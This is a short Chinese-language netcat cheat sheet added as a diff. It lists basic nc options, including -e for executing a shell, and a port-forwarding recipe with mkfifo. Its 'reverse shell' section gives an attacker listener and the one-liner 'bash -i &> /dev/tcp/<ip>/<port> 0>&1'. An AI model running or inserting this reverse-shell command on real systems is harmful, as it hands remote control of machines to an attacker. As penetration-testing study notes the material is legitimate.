@@ -1,0 +1,14 @@
+nc常用命令：
+	nc -l -p <port> 在某个端口监听
+	nc <host> <port> 连接主机某个端口
+	-w <second> 超时后断开连接
+	-e <shell> 执行输入的命令
+	（使用重定向或管道命令可传输文件）
+
+反弹shell：
+	nc -l -p <port> 黑客监听
+	bash -i &> /dev/tcp/<ip>/<port> 0>&1 
+
+nc端口转发：
+	mkfifo pipe
+	nc -l 8080 0<pipe | nc 192.168.1.200 80 &>pipe
